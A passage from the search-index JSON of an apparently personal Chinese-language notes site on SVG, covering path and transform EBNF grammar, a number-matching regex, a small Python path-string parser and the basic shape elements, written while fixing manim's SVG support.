smooth-curveto-argument-sequence smooth-curveto-argument-sequence : smooth-curveto-argument | smooth-curveto-argument comma-wsp ? smooth-curveto-argument-sequence smooth-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair quadratic-bezier-curveto : ( \" Q \" | \" q \" ) wsp * quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument-sequence : quadratic-bezier-curveto-argument | quadratic-bezier-curveto-argument comma-wsp ? quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair smooth-quadratic-bezier-curveto : ( \" T \" | \" t \" ) wsp * smooth-quadratic-bezier-curveto-argument-sequence smooth-quadratic-bezier-curveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? smooth-quadratic-bezier-curveto-argument-sequence elliptical-arc : ( \" A \" | \" a \" ) wsp * elliptical-arc-argument-sequence elliptical-arc-argument-sequence : elliptical-arc-argument | elliptical-arc-argument comma-wsp ? elliptical-arc-argument-sequence elliptical-arc-argument : nonnegative-number comma-wsp ? nonnegative-number comma-wsp ? number comma-wsp flag comma-wsp ? flag comma-wsp ? coordinate-pair flag : \"0\" | \"1\" path string parser \u00b6 python \u5199\u7684 path string \u89e3\u6790 class InvalidPathError ( ValueError ): pass class _PathStringParser : # modified from https://github.com/regebro/svg.path/ def __init__ ( self , arguments , rules ): self . args = [] arguments = bytearray ( arguments , \"ascii\" ) self . _strip_array ( arguments ) while arguments : for rule in rules : self . _rule_to_function_map [ rule ]( arguments ) @property def _rule_to_function_map ( self ): return { \"x\" : self . _get_number , \"y\" : self . _get_number , \"a\" : self . _get_number , \"u\" : self . _get_unsigned_number , \"f\" : self . _get_flag , } def _strip_array ( self , arg_array ): # wsp: (0x9, 0x20, 0xA, 0xC, 0xD) with comma 0x2C # https://www.w3.org/TR/SVG/paths.html#PathDataBNF while arg_array and arg_array [ 0 ] in [ 0x9 , 0x20 , 0xA , 0xC , 0xD , 0x2C ]: arg_array [ 0 : 1 ] = b \"\" def _get_number ( self , arg_array ): pattern = re . compile ( rb \"^[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) res = pattern . search ( arg_array ) if not res : raise InvalidPathError ( f \"Expected a number, got ' { arg_array } '\" ) number = float ( res . group ()) self . args . append ( number ) arg_array [ res . start (): res . end ()] = b \"\" self . _strip_array ( arg_array ) return number def _get_unsigned_number ( self , arg_array ): number = self . _get_number ( arg_array ) if number < 0 : raise InvalidPathError ( f \"Expected an unsigned number, got ' { number } '\" ) return number def _get_flag ( self , arg_array ): flag = arg_array [ 0 ] if flag != 48 and flag != 49 : raise InvalidPathError ( f \"Expected a flag (0/1), got ' { chr ( flag ) } '\" ) flag -= 48 self . args . append ( flag ) arg_array [ 0 : 1 ] = b \"\" self . _strip_array ( arg_array ) return flag transform \u7684\u5904\u7406 \u00b6 transform \u662f\u5bf9\u5f53\u524d\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u6574\u4e2a\u5750\u6807\u7cfb\u8fdb\u884c\u7684\u53d8\u6362\uff0c\u4ece\u5de6\u5411\u53f3\u7ed3\u5408 \u6240\u4ee5\u4e5f\u5c31\u53ef\u4ee5\u770b\u505a\u5bf9\u5143\u7d20\u5e94\u7528 transform\uff0c\u4f46\u662f\u4ece\u53f3\u5411\u5de6\u7ed3\u5408 \u6240\u6709\u7684 transform \u90fd\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 3 \u9636\u77e9\u9635\uff1a \\[\\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\] \u4f5c\u7528\u65b9\u5f0f\u662f\uff1a \\[ \\begin{bmatrix} x_\\text{prevCoordSys} \\\\ y_\\text{prevCoordSys} \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\cdot \\begin{bmatrix} x_\\text{newCoordSys} \\\\ y_\\text{newCoordSys} \\\\ 1 \\end{bmatrix} \\] \u5176\u4e2d \\((x_\\text{prevCoordSys}, y_\\text{prevCoordSys})\\) \u8868\u793a\u5728 transform \u524d\u7684\u5750\u6807\u7cfb\u7edf\u4e0b\u7684\u5750\u6807\uff0c\u8fd9\u4e2a 3 \u9636 transform \u7684\u77e9\u9635\u8bb0\u4e3a [a b c d e f] SVG \u4e00\u5171\u652f\u6301\u516d\u79cd transform\uff0c\u4e0b\u9762\u5177\u4f53\u6765\u8bf4\uff1a matrix(a b c d e f): \u65bd\u52a0\u77e9\u9635 [a b c d e f] \u4f5c\u7528 translate(tx [ty]): \u5e73\u79fb\uff0cx \u8f74\u79fb tx\uff0cy \u8f74\u79fb ty\uff0c\u5982\u679c\u6ca1\u6709 ty \u5c31\u662f 0\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 0 1 tx ty] scale(sx [sy]): \u7f29\u653e\uff0cx \u8f74\u7f29\u653e sx \u500d\uff0cy \u8f74\u7f29\u653e sy \u500d\uff0c\u5982\u679c\u6ca1\u6709 sy\uff0c\u5219 sy \u548c sx \u76f8\u7b49\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [sx 0 0 sy 0 0] rotate(angle [cx cy]): \u987a\u65f6\u9488\u65cb\u8f6c angle \u5ea6\uff0c\u4ee5 cx cy \u4e3a\u4e2d\u5fc3\uff0c\u6ca1\u6709\u6307\u5b9a\u5c31\u662f\u539f\u70b9 rotate(angle cx cy) \u76f8\u5f53\u4e8e translate(cx cy) rotate(angle) translate(-cx -cy) rotate(a) \u76f8\u5f53\u4e8e\u77e9\u9635 [cos(a) sin(a) -sin(a) cos(a) 0 0] skewX(angle): x \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 tan(a) 1 0 0] skewY(angle): y \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 tan(a) 0 1 0 0] EBNF \u8bed\u6cd5 \u00b6 transform \u7684 EBNF \u8bed\u6cd5 transform-list : wsp * transforms ? wsp * transforms : transform | transform comma-wsp + transforms transform : matrix | translate | scale | rotate | skewX | skewY matrix : \" matrix \" wsp * \"(\" wsp * number comma-wsp number comma-wsp number comma-wsp number comma-wsp number comma-wsp number wsp * \")\" translate : \" translate \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" scale : \" scale \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" rotate : \" rotate \" wsp * \"(\" wsp * number ( comma-wsp number comma-wsp number )? wsp * \")\" skewX : \" skewX \" wsp * \"(\" wsp * number wsp * \")\" skewY : \" skewY \" wsp * \"(\" wsp * number wsp * \")\" \u6b63\u5219\u5339\u914d\u5206\u79bb transform: transform_pattern = re . compile ( \"|\" . join ([ x + r \"[^)]*\\)\" for x in transform_names ])) \u91cc\u9762\u7684 number \u90fd\u53ef\u4ee5\u7528\u5f00\u5934\u8bf4\u5230\u7684\u6b63\u5219\u6765\u5339\u914d \u6837\u5f0f \u00b6 \u9ed8\u8ba4\u6837\u5f0f\uff1a DEFAULT_STYLE = { \"fill\" : \"black\" , \"stroke\" : \"none\" , \"fill-opacity\" : \"1\" , \"stroke-opacity\" : \"1\" , \"stroke-width\" : 0 , } \u5269\u4e0b\u7684\u5c31\u662f\u6309\u7167 css \u7684\u89c4\u5219\u5c42\u53e0\u5c31\u597d\u4e86","title":"SVG"},{"location":"cs/web/svg/#svg","text":"Abstract SVG\uff08Scalable Vector Graphics\uff09\u662f\u4e00\u79cd\u57fa\u4e8e XML \u63cf\u8ff0\u77e2\u91cf\u56fe\u5f62\u7684\u56fe\u7247\u683c\u5f0f \u73b0\u884c\u6807\u51c6\u662f SVG 2\uff1a https://www.w3.org/TR/SVG/ SVG 1.1\uff1a https://www.w3.org/TR/SVG11/ SVG 2 \u4ecd\u5728 CR \u9636\u6bb5\uff0c\u533a\u522b\uff1a https://www.w3.org/TR/SVG/changes.html REC-SVG11-20110816.pdf SVG \u6807\u51c6\u6587\u6863\u8fd8\u6ca1\u6709\u5b8c\u6574\u8bfb\u8fc7\uff0c\u8fd9\u91cc\u53ea\u662f\u4e00\u4e9b\u5728\u4fee manim \u7684 SVGMobject \u7684\u65f6\u5019\u5b66\u5230\u7684 SVG \u76f8\u5173\u5185\u5bb9 SVG Namespace: http://www.w3.org/2000/svg Public Identifier for SVG 1.1: PUBLIC \"-//W3C//DTD SVG 1.1//EN\" System Identifier for the SVG 1.1 Recommendation: http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd","title":"SVG"},{"location":"cs/web/svg/#_1","text":"\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u4e3a x \u6b63\u65b9\u5411\uff0c\u5411\u4e0b\u4e3a y \u6b63\u65b9\u5411 transform \u5c5e\u6027\u4f1a\u6539\u53d8\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u5750\u6807\u7cfb","title":"\u5750\u6807\u7cfb\u7edf"},{"location":"cs/web/svg/#ebnf","text":"\u4e00\u4e9b SVG \u7684 EBNF coordinate-pair : coordinate comma-wsp coordinate | coordinate negative-coordinate coordinate : number number : sign ? integer-constant | sign ? floating-point-constant negative-coordinate : \"-\" integer-constant | \"-\" floating-point-constant comma-wsp : ( wsp + comma ? wsp *) | ( comma wsp *) comma : \",\" integer-constant : digit-sequence floating-point-constant : fractional-constant exponent ? | digit-sequence exponent fractional-constant : digit-sequence ? \".\" digit-sequence | digit-sequence \".\" exponent : ( \" e \" | \" E \" ) sign ? digit-sequence sign : \"+\" | \"-\" digit-sequence : digit | digit digit-sequence digit : \"0\" | \"1\" | \"2\" | \"3\" | \"4\" | \"5\" | \"6\" | \"7\" | \"8\" | \"9\" wsp : (# x20 | # x9 | # xD | # xA )+ \u4ece\u540e\u5f80\u524d\u6765\u770b\uff1a wsp\uff1a\u7a7a\u683c\uff0c\u5305\u542b\u56db\u79cd\uff0cASCII \u7801\u503c\u4e3a 0x9, 0x20, 0xA, 0xD \uff08SVG2 \u4e2d\u591a\u4e86 0xC \uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u8fde\u7eed\u591a\u4e2a digit: \u6570\u5b57\u5b57\u7b26\uff0c0 \u5230 9 digit-sequence: \u6570\u5b57\u5b57\u7b26\u5e8f\u5217\uff0c\u53ef\u4ee5\u4e3a\u5355\u4e2a\u6216\u8005\u591a\u4e2a\u6570\u5b57\u5b57\u7b26 sign: \u7b26\u53f7\uff0c+ \u6216 - exponent: \u6307\u6570\uff0ce \u5927\u5c0f\u5199\u5747\u53ef\uff0c\u6307\u6570\u662f\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u5373\u6b63\uff09\u6574\u6570\uff0c\u5982 e2 E+2 E-10 \u5747\u4e3a\u5408\u6cd5 exponent fractional-constant: \u5206\u6570\u5e38\u6570\uff0c\u6574\u6570\u90e8\u5206\u4e3a 0 \u53ef\u4ee5\u7701\u7565\uff0c\u5c0f\u6570\u90e8\u5206\u4e3a 0 \u4e5f\u53ef\u4ee5\u7701\u7565\uff0c\u5982 1.2 .3 4. \u53ef\u4ee5\u8868\u793a\u4e09\u4e2a\u5206\u6570\u5e38\u6570 1.2, 0.3, 4.0 floating-point-constant: \u6d6e\u70b9\u6570\u5e38\u6570\uff0c\u53ef\u4ee5\u662f \u5206\u6570\u5e38\u6570 / \u5206\u6570\u5e38\u6570\u52a0\u6307\u6570 / \u6574\u6570\u5e38\u6570\u52a0\u6307\u6570 integer-constant: \u6574\u6570\u5e38\u6570\uff0c\u5373\u6570\u5b57\u5b57\u7b26\u5e8f\u5217 comma: \u9017\u53f7\u5b57\u7b26 , \uff0cASCII \u7801\u503c 0x2C comma-wsp: \u95f4\u9694\u7b26\uff0c\u53ef\u4ee5\u662f \u9017\u53f7 / \u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c / \u4efb\u610f\u591a\u7a7a\u683c\u52a0\u9017\u53f7\u52a0\u4efb\u610f\u591a\u7a7a\u683c negative-coordinate: \u8d1f\u5750\u6807\u503c\uff0c\u53ef\u4ee5\u662f \u8d1f\u53f7\u52a0\u6574\u6570\u5e38\u6570 / \u8d1f\u53f7\u52a0\u6d6e\u70b9\u6570\u5e38\u6570 number: \u6570\u5b57\uff0c\u6709\u7b26\u53f7\u6216\u8005\u65e0\u7b26\u53f7\uff08\u6b63\uff09\u7684\u6574\u6570\u5e38\u6570\u6216\u8005\u6d6e\u70b9\u6570\u5e38\u6570 coordinate: \u5750\u6807\u503c\uff0c\u5373\u6570\u5b57 number coordinate-pair: \u5750\u6807\uff0c\u53ef\u4ee5\u662f\u4e24\u4e2a\u7528 comma-wsp \u5206\u9694\u7684\u5750\u6807\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5750\u6807\u503c\u4e3a\u8d1f\u7684\u65f6\u5019\u53ef\u4ee5\u4e0d\u8fdb\u884c\u5206\u9694\uff0c\u5373 1-2 \u8868\u793a (1, -2)","title":"\u5e38\u89c1 EBNF \u8bed\u6cd5"},{"location":"cs/web/svg/#_2","text":"\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\u51fa\u4e0a\u9762\u7684 number \u53ef\u4ee5\u76f4\u63a5\u7528\u4e00\u4e2a\u6b63\u5219\u6765\u89e3\u51b3\uff1a [-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)? \u4e5f\u5c31\u662f\u4e0a\u9762\u7684\u6574\u4e2a\u903b\u8f91 \u6574\u4f53\u53ef\u4ee5\u662f +- \u6216\u8005\u4e0d\u6307\u5b9a\uff1a [-+]? \u6307\u6570\u524d\u90e8\u5206\uff1a (?:\\d+(?:\\.\\d*)?|\\.\\d+) \u6709\u6574\u6570\u90e8\u5206\uff1a \\d+(?:\\.\\d*)? \u6574\u6570\u90e8\u5206\uff1a \\d+ \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:\\.\\d*)? \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a \\d* \u65e0\u6574\u6570\u90e8\u5206\uff08\u5373\u5ffd\u7565 0\uff09\uff1a \\.\\d+ \u5c0f\u6570\u70b9\uff1a \\. \u5c0f\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff09\uff1a \\d+ \u6307\u6570\u90e8\u5206\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a (?:[eE][-+]?\\d+)? \u6307\u6570\u6807\u8bc6\uff1a [eE] \u7b26\u53f7\uff08\u53ef\u6709\u53ef\u65e0\uff09\uff1a [-+]? \u6307\u6570\u90e8\u5206\uff08\u4e00\u5b9a\u6709\uff0c\u4e14\u662f\u6574\u6570\uff09\uff1a \\d+ \u4e3a\u4e86\u4e0d\u6355\u83b7 () \u4e2d\u7684\u5185\u5bb9\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u4f7f\u7528\u7684\u65f6\u5019\u76f4\u63a5\u628a\u5339\u914d\u5230\u7684\u5185\u5bb9\u4f20\u5165 float \u5373\u53ef\uff1a number_pattern = re . compile ( r \"[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) numbers = [ float ( x ) for x in number_pattern . findall ( number_string )]","title":"\u8bfb\u53d6\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"cs/web/svg/#svg_1","text":"\u5728\u4e00\u4e2a SVG \u4e2d\uff0c\u53ef\u4ee5\u6709\u5f88\u591a <svg> \u5143\u7d20\uff0c\u6700\u5916\u5c42\u53ea\u6709\u4e00\u4e2a <svg> \u5143\u7d20\uff0c\u5185\u5c42\u53ef\u4ee5\u5d4c\u5957 svg \u89c4\u5b9a\u7684\u5143\u7d20\u90fd\u5728 XML \u547d\u540d\u7a7a\u95f4 http://www.w3.org/2000/svg \u4e2d\uff0c\u6240\u4ee5\u8981\u89c4\u5b9a xmlns=\"http://www.w3.org/2000/svg\" \u5c5e\u6027\uff1a version \u7248\u672c\u53f7\uff0c1.1 / 1.0 x \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 x \u5750\u6807 y \u5bf9\u4e8e\u6700\u5916\u5c42 svg \u5143\u7d20\u6ca1\u6709\u4f5c\u7528\uff0c\u5bf9\u4e8e\u5185\u5c42 svg \u5143\u7d20\u6307\u5b9a\u8fb9\u754c\u7684\u5de6\u4e0a\u89d2\u7684 y \u5750\u6807 width \u89c4\u5b9a\u5bbd\u5ea6\uff0c\u53ef\u4ee5\u662f\u957f\u5ea6\u6216\u8005\u767e\u5206\u6bd4 height \u89c4\u5b9a\u9ad8\u5ea6","title":"&lt;svg> \u5143\u7d20"},{"location":"cs/web/svg/#_3","text":"<g>\uff1a\u5373 group\uff0c\u53ef\u4ee5\u6709\u5b50\u5143\u7d20\uff0c\u5e76\u4e14\u53ef\u4ee5\u6709 id \u7528\u6765\u5f15\u7528 <defs>\uff1a\u5305\u542b\u4e00\u4e9b\u5b50\u5143\u7d20\uff0c\u7528\u6765\u590d\u7528\uff0c\u4e0d\u76f4\u63a5\u663e\u793a <symbol>\uff1a\u7c7b\u4f3c <g> <use>\uff1a\u590d\u7528\uff0c\u901a\u8fc7 xlink:href \u6765\u6307\u5b9a\u5f15\u7528\u5bf9\u8c61\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528 x, y, style \u7b49\u4e00\u7cfb\u5217\u5c5e\u6027\u6765\u89c4\u5b9a\u4f4d\u7f6e\u548c\u6837\u5f0f","title":"\u5176\u4ed6\u7ed3\u6784\u5143\u7d20"},{"location":"cs/web/svg/#_4","text":"\u5143\u7d20 \u5c5e\u6027 <rect> x, y \u5de6\u4e0a\u89d2\u5750\u6807 width, height \u77e9\u5f62\u5bbd\u9ad8 <circle> cx, cy \u5706\u5fc3\u5750\u6807 r \u5706\u534a\u5f84 <ellipse> cx, cy \u692d\u5706\u4e2d\u5fc3\u5750\u6807 rx, ry \u6c34\u5e73/\u5782\u76f4\u534a\u5f84 <line> x1, y1 \u8d77\u70b9\u5750\u6807 x2, y2 \u7ec8\u70b9\u5750\u6807 <polygon> points \u591a\u8fb9\u5f62\u7aef\u70b9\u5750\u6807 <polyline> points \u6298\u7ebf\u7aef\u70b9\u5750\u6807 <path> d \u8def\u5f84\u6307\u4ee4","title":"\u5f62\u72b6\u5143\u7d20"},{"location":"cs/web/svg/#polygon-polyline-points","text":"EBNF \u8bed\u6cd5 \u5b83\u4eec\u7684 points \u5c5e\u6027\u7684\u503c\u90fd\u662f list-of-points \u7c7b\u578b list-of-points : wsp * coordinate-pairs ? wsp * coordinate-pairs : coordinate-pair | coordinate-pair comma-wsp coordinate-pairs \u7531\u4e0a\u9762\u7684\u89e3\u91ca\u540c\u7406\uff0c\u8fd9\u4e2a EBNF \u4e5f\u975e\u5e38\u6e05\u6670 coordinate-pairs: \u5750\u6807\u7ec4\uff0c\u7528 comma-wsp \u5206\u9694\u7684\u591a\u4e2a\u5750\u6807 list-of-points: \u70b9\u96c6\uff0c\u53ef\u4ee5\u662f \u7a7a / \u4efb\u610f\u591a\u7a7a\u683c / \u524d\u540e\u6709\u4efb\u610f\u591a\u7a7a\u683c\uff08\u542b0\uff09\u7684\u5750\u6807\u7ec4 points \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u4e3a path string\uff0cmanim \u4e2d\u5c31\u662f\u8fd9\u6837\u5904\u7406\u7684\uff0c\u5373\u628a\u6240\u6709 wsp digit \u90fd\u66ff\u6362\u4e3a \"L\" wsp digit\uff0c\u7136\u540e\u628a\u7b2c\u4e00\u4e2a L \u66ff\u6362\u4e3a M","title":"&lt;polygon> \u548c &lt;polyline> \u7684 points \u8bed\u6cd5"},{"location":"cs/web/svg/#path","text":"<path> \u5143\u7d20\u901a\u8fc7\u5b83\u7684 d \u5c5e\u6027\u6765\u6307\u5b9a\u8def\u5f84\uff0c\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u8def\u5f84\u5b57\u7b26\u4e32\u7531\u4e00\u4e9b\u63a7\u5236\u547d\u4ee4\u548c\u540e\u9762\u63a5\u7740\u7684\u53c2\u6570\u6784\u6210\uff0c\u4e00\u5171\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff0c\u5206\u522b\u6709\u5927\u5199\u548c\u5c0f\u5199\u7684\u5f62\u5f0f \u5927\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u5c0f\u5199\u8868\u793a\u540e\u9762\u7684\u53c2\u6570\u91cc\u7684\u5750\u6807\u662f\u76f8\u5bf9\u4e8e\u5f53\u524d\u5750\u6807\u7684\u76f8\u5bf9\u4f4d\u7f6e \u5e76\u4e14\u4e3a\u4e86\u538b\u7f29 SVG \u7684\u5927\u5c0f\uff0c\u4e5f\u6709\u4e00\u4e9b\u5141\u8bb8\u7684\u7f29\u5199\u89c4\u5219\uff1a \u53ef\u4ee5\u7701\u7565\u4e0d\u5fc5\u8981\u7684 comma-wsp \u5206\u9694\u7b26 \u5982\u679c\u591a\u6b21\u4f7f\u7528\u540c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5219\u9664\u4e86\u7b2c\u4e00\u6b21\u4ee5\u5916\u5747\u53ef\u4ee5\u7701\u7565\u547d\u4ee4 \u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5750\u6807 \u53ef\u4ee5\u4f7f\u7528\u6c34\u5e73\u548c\u5782\u76f4\u60c5\u51b5\u7684 lineto \u53ef\u4ee5\u7528 S/s/T/t \u6765\u7701\u7565\u7b2c\u4e00\u4e2a\u63a7\u5236\u70b9 \u4e0b\u9762\u4f9d\u6b21\u6765\u8bf4\u660e\u8fd9\u5341\u79cd\u63a7\u5236\u547d\u4ee4\uff1a \u547d\u4ee4 \u540d\u79f0 \u53c2\u6570 \u63cf\u8ff0 M or m moveto (x y)+ \u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff0c\u53c2\u6570\u662f\u8d77\u70b9\u5750\u6807 \u5982\u679c\u53c2\u6570\u662f\u591a\u7ec4\u5750\u6807\uff0c\u5219\u9664\u7b2c\u4e00\u4e2a\u4ee5\u5916\u90fd\u5f53\u6210 L/l \u6307\u4ee4\u7684\u53c2\u6570\u6765\u5904\u7406 Z or z closepath \u5173\u95ed\u8def\u5f84\uff0c\u5373\u4ece\u5f53\u524d\u70b9\u5230\u5f53\u524d\u5b50\u8def\u5f84\u5f00\u5934\u70b9\u753b\u4e00\u6761\u76f4\u7ebf Z \u548c z \u7684\u6548\u679c\u76f8\u540c L or l lineto (x y)+ \u4ece\u5f53\u524d\u70b9\u5f00\u59cb\u753b\u76f4\u7ebf\uff0c\u53c2\u6570\u662f\u7aef\u70b9\u5750\u6807 H or h horizontal lineto x+ \u753b\u4e00\u6761\u6c34\u5e73\u7ebf\uff0c\u5230\u6a2a\u5750\u6807 x \u7684\u4f4d\u7f6e V or v vertical lineto y+ \u753b\u4e00\u6761\u7ad6\u76f4\u7ebf\uff0c\u5230\u7eb5\u5750\u6807 y \u7684\u4f4d\u7f6e C or c curveto (x1 y1 x2 y2 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\uff0c(x2, y2) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 S or s smooth curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e09\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u7684\u7b2c\u4e8c\u4e2a\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9\uff0c(x1, y1) \u662f\u7ed3\u675f\u70b9\u7684\u63a7\u5236\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e09\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08CcSs\uff09\uff0c\u5219\u5f53\u524d\u70b9\u7684\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 Q or q quadratic bezier curveto (x1 y1 x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d (x1, y1) \u662f\u63a7\u5236\u70b9 T or t smooth quadratic bezier curveto (x y)+ \u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08QqTt\uff09\uff0c\u5219\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 A or a elliptical arc \u6700\u540e\u4e00\u4e2a\u692d\u5706\u5f27\u7684\u53c2\u6570\u548c\u7528\u6cd5\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u6765\u8bf4\uff1a \u53c2\u6570\uff1a(rx ry x-axis-rotation large-arc-flag sweep-flag x y)+ \u7528\u6cd5\uff1a rx, ry\uff1a\u692d\u5706\u5f27\u7684\u6c34\u5e73\u548c\u5782\u76f4\u534a\u5f84 x-axis-rotation\uff1a\u4e00\u4e2a\u89d2\u5ea6\uff0c\u4ee5 deg \u4e3a\u5355\u4f4d\uff0c\u8868\u793a x \u8f74\u65cb\u8f6c\u89d2\u5ea6 large-arc-flag: 0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u52a3\u5f27\uff0c1 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u4f18\u5f27 sweep-flag\uff1a0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u6cbf\u9006\u65f6\u9488\u753b\u5f27\uff0c1 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u987a\u65f6\u9488\u753b\u5f27 x, y\uff1a\u7ec8\u70b9\u5750\u6807 A \u547d\u4ee4\u4f8b\u5b50","title":"&lt;path> \u8def\u5f84"},{"location":"cs/web/svg/#ebnf_1","text":"d \u5c5e\u6027\u91cc\u7684\u662f svg-path \u7c7b\u578b\uff0c\u5b9a\u4e49\u662f\uff1a svg-path : wsp * moveto-drawto-command-groups ? wsp * moveto-drawto-command-groups : moveto-drawto-command-group | moveto-drawto-command-group wsp * moveto-drawto-command-groups moveto-drawto-command-group : moveto wsp * drawto-commands ? drawto-commands : drawto-command | drawto-command wsp * drawto-commands drawto-command : closepath | lineto | horizontal-lineto | vertical-lineto | curveto | smooth-curveto | quadratic-bezier-curveto | smooth-quadratic-bezier-curveto | elliptical-arc drawto-command: \u9664\u4e86 M/m \u4ee5\u5916\u7684 9 \u79cd\u547d\u4ee4\u5b57\u7b26\u4e32 drawto-commands: \u7528\u4efb\u610f\u591a\uff08\u53ef\u4e3a0\uff09 wsp \u5206\u9694\u7684 drawto-command moveto-drawto-command-group: moveto \u547d\u4ee4\u5f00\u5934\u7684\u547d\u4ee4\u7ec4\uff08\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u5b50\u8def\u5f84\uff09\uff0c\u53ef\u4ee5\u4ec5\u6709 moveto\uff0c\u4e5f\u53ef\u4ee5\u662f\u7531\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684\u4e00\u4e9b\u547d\u4ee4 moveto-drawto-command-groups: \u5b50\u8def\u5f84\u96c6\u5408\uff0c\u7528\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684 moveto-drawto-command-group svg-path: \u53ef\u4ee5\u4e3a \u7a7a / \u5f00\u5934\u7ed3\u5c3e\u6709\u4efb\u610f\u591a wsp \u7684 moveto-drawto-command-groups 